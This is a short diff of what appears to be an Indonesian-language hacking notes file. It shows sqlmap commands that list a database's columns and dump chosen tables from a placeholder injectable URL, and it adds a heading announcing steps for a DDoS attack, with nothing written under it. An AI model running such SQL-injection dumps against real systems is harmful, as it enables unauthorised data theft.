@@ -56,3 +56,5 @@ sqlmap -u "linkinputvulnSqlInjection" -D db_name -T table_name --columns
 ```bash
 sqlmap -u "linkinputvulnSqlInjection" -D db_name -T table_name name_columns,name_columns --dump
 ```
+
+## Langkah-langkah melakukan Attack DDOS 
